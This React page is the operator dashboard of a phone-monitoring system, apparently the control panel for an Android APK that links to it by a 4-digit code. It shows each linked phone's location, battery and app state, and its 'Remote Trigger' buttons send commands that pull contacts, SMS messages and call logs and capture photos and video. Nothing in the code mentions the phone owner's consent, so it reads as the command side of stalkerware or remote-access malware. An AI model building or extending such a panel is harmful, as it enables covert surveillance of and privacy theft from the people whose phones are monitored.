import { useEffect, useState, useCallback, useRef } from "react";
import AppLayout from "@components/layout/AppLayout";
import PageMeta from "@components/common/PageMeta";
import Badge from "@components/ui/badge/Badge";
import PageBreadCrumb from "@components/common/PageBreadCrumb";
import type { RealtimeDeviceState } from "@/pages/api/realtime";
// ─── Types ────────────────────────────────────────────────────────────────────

interface Device {
  id: string;
  name: string | null;
  brand: string | null;
  model: string | null;
  os: string | null;
  osVersion: string | null;
  updatedAt: string;
  batteryLevel: number | null;
  batteryState: string | null;
  appState: string | null;
  _count: { events: number };
  events: { timestamp: string; type: string }[];
}

interface DeviceEvent {
  id: string;
  deviceId: string;
  type: string;
  timestamp: string;
  data: Record<string, unknown>;
  device: Device;
}

interface DeviceCommand {
  id: string;
  deviceId: string;
  command: string;
  status: string;
  result: Record<string, unknown> | null;
  createdAt: string;
  executedAt: string | null;
}

type EventType =
  | "all"
  | "app_open"
  | "battery_level"
  | "network_change"
  | "location_update"
  | "contacts_sync"
  | "custom";

// ─── Helpers ──────────────────────────────────────────────────────────────────

const EVENT_COLORS: Record<string, "success" | "error" | "warning" | "info" | "primary" | "light"> = {
  app_open: "success",
  app_close: "error",
  battery_level: "warning",
  network_change: "primary",
  location_update: "info",
  contacts_sync: "light",
  sms_sync: "light",
  call_log_sync: "light",
  custom: "light",
};

function timeAgo(date: string) {
  const diff = Date.now() - new Date(date).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "just now";
  if (mins < 60) return `${mins}m ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h ago`;
  return `${Math.floor(hrs / 24)}d ago`;
}

function batteryIcon(level: number | null) {
  if (level === null) return "🔋";
  if (level < 0.2) return "🪫";
  if (level < 0.5) return "🔋";
  return "🔋";
}

function batteryColor(level: number | null) {
  if (level === null) return "text-gray-400";
  if (level < 0.2) return "text-red-500";
  if (level < 0.5) return "text-orange-500";
  return "text-green-500";
}

// ─── Components ───────────────────────────────────────────────────────────────

function StatCard({ label, value, sub, accent }: {
  label: string;
  value: string | number;
  sub?: string;
  accent?: string;
}) {
  return (
    <div className="rounded-xl border border-gray-200 dark:border-gray-800 bg-white dark:bg-gray-900 p-4">
      <p className="text-sm text-gray-500 dark:text-gray-400">{label}</p>
      <p className={`mt-1 text-2xl font-bold ${accent ?? "text-gray-900 dark:text-white"}`}>{value}</p>
      {sub && <p className="mt-0.5 text-xs text-gray-400">{sub}</p>}
    </div>
  );
}

function RealtimeBatteryBar({ level, state }: { level: number | null; state: string | null }) {
  if (level === null) return <span className="text-xs text-gray-400">—</span>;
  const pct = Math.round(level * 100);
  const color = level < 0.2 ? "bg-red-500" : level < 0.5 ? "bg-orange-400" : "bg-green-500";
  return (
    <div className="flex items-center gap-2 mt-1">
      <div className="flex-1 h-2 bg-gray-200 dark:bg-gray-700 rounded-full overflow-hidden">
        <div className={`h-full rounded-full ${color}`} style={{ width: `${pct}%` }} />
      </div>
      <span className={`text-xs font-bold ${batteryColor(level)}`}>{pct}%</span>
      {state && <span className="text-xs text-gray-400 capitalize">{state}</span>}
    </div>
  );
}

function DeviceCard({
  device,
  realtimeState,
  selected,
  onClick,
}: {
  device: Device;
  realtimeState: RealtimeDeviceState | undefined;
  selected: boolean;
  onClick: () => void;
}) {
  const lastEvent = device.events[0];
  const level = realtimeState?.batteryLevel ?? device.batteryLevel;
  const state = realtimeState?.batteryState ?? device.batteryState;
  const appState = realtimeState?.appState ?? device.appState;

  return (
    <button
      onClick={onClick}
      className={`w-full text-left rounded-xl border p-3 transition-all ${
        selected
          ? "border-brand-500 bg-brand-50 dark:bg-brand-500/10"
          : "border-gray-200 dark:border-gray-800 bg-white dark:bg-gray-900 hover:border-brand-300"
      }`}
    >
      <div className="flex items-center justify-between gap-2">
        <span className="font-medium text-sm text-gray-900 dark:text-white truncate">
          {device.brand ?? ""} {device.model ?? device.id.slice(0, 12)}
        </span>
        <Badge color={appState === "active" ? "success" : "warning"} size="sm">
          {appState ?? "unknown"}
        </Badge>
      </div>
      <p className="mt-0.5 text-xs text-gray-400 truncate">{device.id}</p>
      <RealtimeBatteryBar level={level} state={state} />
      {lastEvent && (
        <p className="mt-1 text-xs text-gray-500">
          Last: <span className="text-gray-700 dark:text-gray-300">{lastEvent.type}</span>
          {" "}· {timeAgo(lastEvent.timestamp)}
        </p>
      )}
    </button>
  );
}

function EventRow({ event }: { event: DeviceEvent }) {
  const [open, setOpen] = useState(false);
  const color = EVENT_COLORS[event.type] ?? "light";

  return (
    <>
      <tr
        className="border-b border-gray-100 dark:border-gray-800 hover:bg-gray-50 dark:hover:bg-gray-800/50 cursor-pointer"
        onClick={() => setOpen((v) => !v)}
      >
        <td className="px-4 py-3 whitespace-nowrap">
          <Badge color={color} size="sm">{event.type}</Badge>
        </td>
        <td className="px-4 py-3 text-sm text-gray-600 dark:text-gray-300 whitespace-nowrap">
          {new Date(event.timestamp).toLocaleString()}
        </td>
        <td className="px-4 py-3 text-xs text-gray-400 max-w-xs truncate">
          {event.type === "location_update" && (event.data as Record<string, unknown>).mapsUrl ? (
            <a
              href={(event.data as Record<string, unknown>).mapsUrl as string}
              target="_blank"
              rel="noopener noreferrer"
              className="text-brand-500 hover:underline"
              onClick={(e) => e.stopPropagation()}
            >
              📍 Open in Maps
            </a>
          ) : (
            JSON.stringify(event.data).slice(0, 80)
          )}
        </td>
        <td className="px-4 py-3 text-xs text-gray-400 text-right whitespace-nowrap">
          {timeAgo(event.timestamp)}
          <span className="ml-2 text-gray-300">{open ? "▲" : "▼"}</span>
        </td>
      </tr>
      {open && (
        <tr className="bg-gray-50 dark:bg-gray-800/50">
          <td colSpan={4} className="px-4 py-3">
            <pre className="text-xs text-gray-600 dark:text-gray-300 overflow-x-auto whitespace-pre-wrap">
              {JSON.stringify(event.data, null, 2)}
            </pre>
          </td>
        </tr>
      )}
    </>
  );
}

function CommandRow({ cmd }: { cmd: DeviceCommand }) {
  const [open, setOpen] = useState(false);
  const statusColor = cmd.status === "executed" ? "success" : cmd.status === "failed" ? "error" : "warning";

  return (
    <>
      <tr
        className="border-b border-gray-100 dark:border-gray-800 hover:bg-gray-50 dark:hover:bg-gray-800/50 cursor-pointer"
        onClick={() => setOpen((v) => !v)}
      >
        <td className="px-4 py-3 whitespace-nowrap">
          <span className="text-xs font-mono text-gray-700 dark:text-gray-300">{cmd.command}</span>
        </td>
        <td className="px-4 py-3 whitespace-nowrap">
          <Badge color={statusColor} size="sm">{cmd.status}</Badge>
        </td>
        <td className="px-4 py-3 text-xs text-gray-400 whitespace-nowrap">
          {new Date(cmd.createdAt).toLocaleString()}
        </td>
        <td className="px-4 py-3 text-xs text-gray-400 text-right whitespace-nowrap">
          {cmd.executedAt ? timeAgo(cmd.executedAt) : "—"}
          <span className="ml-2 text-gray-300">{open ? "▲" : "▼"}</span>
        </td>
      </tr>
      {open && cmd.result && (
        <tr className="bg-gray-50 dark:bg-gray-800/50">
          <td colSpan={4} className="px-4 py-3">
            <pre className="text-xs text-gray-600 dark:text-gray-300 overflow-x-auto whitespace-pre-wrap">
              {JSON.stringify(cmd.result, null, 2)}
            </pre>
          </td>
        </tr>
      )}
    </>
  );
}

// ─── Add Device Modal ─────────────────────────────────────────────────────────

function AddDeviceModal({ onClose, onLinked }: { onClose: () => void; onLinked: () => void }) {
  const [digits, setDigits] = useState<string[]>(["", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const inputs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...digits];
    next[index] = value.slice(-1);
    setDigits(next);
    setError(null);
    if (value && index < 3) inputs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
    const next = ["", "", "", ""];
    pasted.split("").forEach((c, i) => { next[i] = c; });
    setDigits(next);
    inputs.current[Math.min(pasted.length, 3)]?.focus();
  };

  const handleSubmit = async () => {
    const code = digits.join("");
    if (code.length < 4) {
      setError("Masukkan 4 digit kode dari APK");
      return;
    }
    setLoading(true);
    setError(null);
    try {
      // Ambil token dari cookie
      const token = document.cookie
        .split("; ")
        .find((r) => r.startsWith("token="))
        ?.split("=")[1];

      const res = await fetch("/api/devices/link", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
        body: JSON.stringify({ code }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(data.error ?? "Gagal menghubungkan device");
      } else {
        setSuccess(`Device "${data.device.brand ?? ""} ${data.device.model ?? data.device.id}" berhasil terhubung!`);
        setTimeout(() => {
          onLinked();
          onClose();
        }, 1500);
      }
    } catch {
      setError("Gagal terhubung ke server");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
      <div className="bg-white dark:bg-gray-900 rounded-2xl shadow-xl p-6 w-full max-w-sm mx-4">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-lg font-bold text-gray-900 dark:text-white">Tambah Device</h2>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-200 text-xl leading-none"
          >
            ✕
          </button>
        </div>

        <p className="text-sm text-gray-500 dark:text-gray-400 mb-6">
          Buka APK Device Monitor di HP kamu, lihat kode 4 digit di halaman Dashboard atau Settings, lalu masukkan di sini.
        </p>

        {/* 4 digit input */}
        <div className="flex justify-center gap-3 mb-4">
          {digits.map((d, i) => (
            <input
              key={i}
              ref={(el) => { inputs.current[i] = el; }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={d}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              onPaste={handlePaste}
              className="w-14 h-16 text-center text-2xl font-bold border-2 border-gray-300 dark:border-gray-600 rounded-xl focus:outline-none focus:border-brand-500 dark:bg-gray-800 dark:text-white transition-colors"
            />
          ))}
        </div>

        {error && (
          <p className="text-sm text-red-500 text-center mb-3">{error}</p>
        )}
        {success && (
          <p className="text-sm text-green-500 text-center mb-3">✓ {success}</p>
        )}

        <button
          disabled={loading || digits.join("").length < 4}
          onClick={handleSubmit}
          className="w-full py-2.5 bg-brand-500 hover:bg-brand-600 disabled:opacity-50 text-white font-semibold rounded-xl transition-colors"
        >
          {loading ? "Menghubungkan…" : "Hubungkan Device"}
        </button>
      </div>
    </div>
  );
}



export default function MonitorPage() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [events, setEvents] = useState<DeviceEvent[]>([]);
  const [commands, setCommands] = useState<DeviceCommand[]>([]);
  const [total, setTotal] = useState(0);
  const [totalPages, setTotalPages] = useState(1);
  const [page, setPage] = useState(1);
  const [selectedDevice, setSelectedDevice] = useState<string>("all");
  const [selectedType, setSelectedType] = useState<EventType>("all");
  const [activeTab, setActiveTab] = useState<"events" | "commands">("events");
  const [loading, setLoading] = useState(false);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [sending, setSending] = useState<string | null>(null);
  const [showAddDevice, setShowAddDevice] = useState(false);

  // Realtime states from SSE — deviceId → state
  const [realtimeStates, setRealtimeStates] = useState<Record<string, RealtimeDeviceState>>({});
  const sseRef = useRef<EventSource | null>(null);

  // ─── SSE subscription ───────────────────────────────────────────────────────

  useEffect(() => {
    const es = new EventSource("/api/realtime");
    sseRef.current = es;

    es.onmessage = (e) => {
      try {
        const state = JSON.parse(e.data) as RealtimeDeviceState;
        setRealtimeStates((prev) => ({ ...prev, [state.deviceId]: state }));
      } catch {
        // ignore parse errors
      }
    };

    return () => {
      es.close();
      sseRef.current = null;
    };
  }, []);

  // ─── Data fetching ──────────────────────────────────────────────────────────

  const fetchDevices = useCallback(async () => {
    const res = await fetch("/api/devices");
    const data = await res.json();
    setDevices(data.devices ?? []);
  }, []);

  const fetchEvents = useCallback(async () => {
    setLoading(true);
    const params = new URLSearchParams({ limit: "30", page: String(page) });
    if (selectedDevice !== "all") params.set("deviceId", selectedDevice);
    if (selectedType !== "all") params.set("type", selectedType);

    const res = await fetch(`/api/events?${params}`);
    const data = await res.json();
    setEvents(data.events ?? []);
    setTotal(data.total ?? 0);
    setTotalPages(data.totalPages ?? 1);
    setLoading(false);
  }, [selectedDevice, selectedType, page]);

  const fetchCommands = useCallback(async () => {
    if (selectedDevice === "all") return;
    const res = await fetch(`/api/commands?deviceId=${selectedDevice}&limit=30`);
    const data = await res.json();
    setCommands(data.commands ?? []);
  }, [selectedDevice]);

  useEffect(() => { fetchDevices(); }, [fetchDevices]);
  useEffect(() => { fetchEvents(); }, [fetchEvents]);
  useEffect(() => { fetchCommands(); }, [fetchCommands]);

  useEffect(() => {
    if (!autoRefresh) return;
    const interval = setInterval(() => {
      fetchDevices();
      fetchEvents();
      fetchCommands();
    }, 10_000);
    return () => clearInterval(interval);
  }, [autoRefresh, fetchDevices, fetchEvents, fetchCommands]);

  useEffect(() => { setPage(1); }, [selectedDevice, selectedType]);

  // ─── Send command ───────────────────────────────────────────────────────────

  const sendCommand = useCallback(async (command: string) => {
    if (selectedDevice === "all") return;
    setSending(command);
    try {
      await fetch("/api/commands", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ deviceId: selectedDevice, command }),
      });
      setTimeout(() => fetchCommands(), 500);
    } finally {
      setSending(null);
    }
  }, [selectedDevice, fetchCommands]);

  // ─── Stats ──────────────────────────────────────────────────────────────────

  const totalEvents = devices.reduce((sum, d) => sum + d._count.events, 0);
  const selectedDeviceData = selectedDevice !== "all"
    ? devices.find((d) => d.id === selectedDevice)
    : null;
  const realtimeForSelected = selectedDevice !== "all"
    ? realtimeStates[selectedDevice]
    : null;

  const displayBatteryLevel = realtimeForSelected?.batteryLevel
    ?? selectedDeviceData?.batteryLevel
    ?? null;

  return (
    <AppLayout>
      <PageMeta title="Device Monitor" description="Realtime device activity dashboard" />
      <PageBreadCrumb pageTitle="Device Monitor" />

      {/* ── Add Device Modal ──────────────────────────────────────── */}
      {showAddDevice && (
        <AddDeviceModal
          onClose={() => setShowAddDevice(false)}
          onLinked={() => { fetchDevices(); fetchEvents(); }}
        />
      )}

      {/* ── Stats ─────────────────────────────────────────────────────── */}
      <div className="grid grid-cols-2 gap-3 sm:grid-cols-4 mb-6">
        <StatCard label="Total Devices" value={devices.length} />
        <StatCard label="Total Events" value={totalEvents} />
        <StatCard
          label="Battery (selected)"
          value={
            displayBatteryLevel !== null
              ? `${Math.round(displayBatteryLevel * 100)}%`
              : "—"
          }
          sub={realtimeForSelected?.batteryState ?? selectedDeviceData?.batteryState ?? undefined}
          accent={
            displayBatteryLevel !== null
              ? displayBatteryLevel < 0.2
                ? "text-red-500"
                : displayBatteryLevel < 0.5
                ? "text-orange-500"
                : "text-green-500"
              : undefined
          }
        />
        <StatCard
          label="App State"
          value={realtimeForSelected?.appState ?? selectedDeviceData?.appState ?? "—"}
          sub="realtime"
        />
      </div>

      <div className="flex gap-4 flex-col lg:flex-row">
        {/* ── Device List ───────────────────────────────────────────────── */}
        <div className="w-full lg:w-64 shrink-0 space-y-2">
          <div className="flex items-center justify-between mb-1">
            <h2 className="text-sm font-semibold text-gray-700 dark:text-gray-300">Devices</h2>
            <div className="flex items-center gap-2">
              <button
                onClick={() => setShowAddDevice(true)}
                className="text-xs bg-brand-500 hover:bg-brand-600 text-white px-2 py-1 rounded-lg font-medium transition-colors"
              >
                + Add
              </button>
              <button
                onClick={() => { fetchDevices(); fetchEvents(); fetchCommands(); }}
                className="text-xs text-brand-500 hover:underline"
              >
                Refresh
              </button>
            </div>
          </div>

          <button
            onClick={() => setSelectedDevice("all")}
            className={`w-full text-left rounded-xl border p-3 transition-all text-sm ${
              selectedDevice === "all"
                ? "border-brand-500 bg-brand-50 dark:bg-brand-500/10 text-brand-600 dark:text-brand-400 font-medium"
                : "border-gray-200 dark:border-gray-800 bg-white dark:bg-gray-900 text-gray-700 dark:text-gray-300"
            }`}
          >
            All Devices ({devices.length})
          </button>

          {devices.map((d) => (
            <DeviceCard
              key={d.id}
              device={d}
              realtimeState={realtimeStates[d.id]}
              selected={selectedDevice === d.id}
              onClick={() => setSelectedDevice(d.id)}
            />
          ))}
        </div>

        {/* ── Main Panel ────────────────────────────────────────────────── */}
        <div className="flex-1 min-w-0">

          {/* ── Command Buttons (hanya kalau device dipilih) ─────────── */}
          {selectedDevice !== "all" && (
            <div className="flex flex-wrap gap-2 mb-4 p-3 rounded-xl border border-gray-200 dark:border-gray-800 bg-white dark:bg-gray-900">
              <span className="text-xs font-semibold text-gray-500 self-center mr-1">Remote Trigger:</span>
              {[
                { cmd: "fetch_contacts", label: "📒 Contacts", color: "bg-blue-500 hover:bg-blue-600" },
                { cmd: "fetch_sms", label: "💬 SMS", color: "bg-purple-500 hover:bg-purple-600" },
                { cmd: "fetch_calls", label: "📞 Call Log", color: "bg-indigo-500 hover:bg-indigo-600" },
                { cmd: "take_photo", label: "📷 Photo", color: "bg-green-500 hover:bg-green-600" },
                { cmd: "take_video", label: "🎥 Video", color: "bg-red-500 hover:bg-red-600" },
              ].map(({ cmd, label, color }) => (
                <button
                  key={cmd}
                  disabled={sending === cmd}
                  onClick={() => sendCommand(cmd)}
                  className={`px-3 py-1.5 text-xs text-white rounded-lg font-medium transition-opacity disabled:opacity-50 ${color}`}
                >
                  {sending === cmd ? "Sending…" : label}
                </button>
              ))}
            </div>
          )}

          {/* ── Tabs: Events / Commands ───────────────────────────────── */}
          <div className="flex gap-1 mb-3">
            {(["events", "commands"] as const).map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`px-4 py-1.5 text-sm rounded-lg font-medium transition-all ${
                  activeTab === tab
                    ? "bg-brand-500 text-white"
                    : "text-gray-600 dark:text-gray-300 hover:bg-gray-100 dark:hover:bg-gray-800"
                }`}
              >
                {tab === "events" ? "Events" : "Commands"}
              </button>
            ))}
            <label className="ml-auto flex items-center gap-2 text-sm text-gray-600 dark:text-gray-300 cursor-pointer">
              <input
                type="checkbox"
                checked={autoRefresh}
                onChange={(e) => setAutoRefresh(e.target.checked)}
                className="rounded"
              />
              Auto refresh
            </label>
          </div>

          {/* ── Events Table ──────────────────────────────────────────── */}
          {activeTab === "events" && (
            <>
              <div className="flex flex-wrap items-center gap-3 mb-3">
                <select
                  value={selectedType}
                  onChange={(e) => setSelectedType(e.target.value as EventType)}
                  className="text-sm rounded-lg border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-900 text-gray-700 dark:text-gray-300 px-3 py-1.5"
                >
                  <option value="all">All Types</option>
                  <option value="app_open">app_open</option>
                  <option value="battery_level">battery_level</option>
                  <option value="network_change">network_change</option>
                  <option value="location_update">location_update</option>
                  <option value="contacts_sync">contacts_sync</option>
                  <option value="custom">custom</option>
                </select>
                <span className="text-sm text-gray-500">
                  {total} event{total !== 1 ? "s" : ""}
                </span>
              </div>

              <div className="rounded-xl border border-gray-200 dark:border-gray-800 overflow-hidden">
                <div className="overflow-x-auto">
                  <table className="w-full text-left">
                    <thead className="bg-gray-50 dark:bg-gray-800">
                      <tr>
                        <th className="px-4 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wide">Type</th>
                        <th className="px-4 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wide">Timestamp</th>
                        <th className="px-4 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wide">Data</th>
                        <th className="px-4 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wide text-right">When</th>
                      </tr>
                    </thead>
                    <tbody className="bg-white dark:bg-gray-900 divide-y divide-gray-100 dark:divide-gray-800">
                      {loading ? (
                        <tr><td colSpan={4} className="px-4 py-8 text-center text-sm text-gray-400">Loading...</td></tr>
                      ) : events.length === 0 ? (
                        <tr><td colSpan={4} className="px-4 py-8 text-center text-sm text-gray-400">No events yet.</td></tr>
                      ) : (
                        events.map((e) => <EventRow key={e.id} event={e} />)
                      )}
                    </tbody>
                  </table>
                </div>
              </div>

              {totalPages > 1 && (
                <div className="flex items-center justify-between mt-4">
                  <button
                    disabled={page <= 1}
                    onClick={() => setPage((p) => p - 1)}
                    className="px-3 py-1.5 text-sm rounded-lg border border-gray-200 dark:border-gray-700 disabled:opacity-40"
                  >Previous</button>
                  <span className="text-sm text-gray-500">Page {page} of {totalPages}</span>
                  <button
                    disabled={page >= totalPages}
                    onClick={() => setPage((p) => p + 1)}
                    className="px-3 py-1.5 text-sm rounded-lg border border-gray-200 dark:border-gray-700 disabled:opacity-40"
                  >Next</button>
                </div>
              )}
            </>
          )}

          {/* ── Commands Table ────────────────────────────────────────── */}
          {activeTab === "commands" && (
            <div className="rounded-xl border border-gray-200 dark:border-gray-800 overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead className="bg-gray-50 dark:bg-gray-800">
                    <tr>
                      <th className="px-4 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wide">Command</th>
                      <th className="px-4 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wide">Status</th>
                      <th className="px-4 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wide">Sent At</th>
                      <th className="px-4 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wide text-right">Executed</th>
                    </tr>
                  </thead>
                  <tbody className="bg-white dark:bg-gray-900 divide-y divide-gray-100 dark:divide-gray-800">
                    {commands.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="px-4 py-8 text-center text-sm text-gray-400">
                          {selectedDevice === "all"
                            ? "Select a device to see commands."
                            : "No commands yet. Use the buttons above to trigger."}
                        </td>
                      </tr>
                    ) : (
                      commands.map((c) => <CommandRow key={c.id} cmd={c} />)
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>
      </div>
    </AppLayout>
  );
}
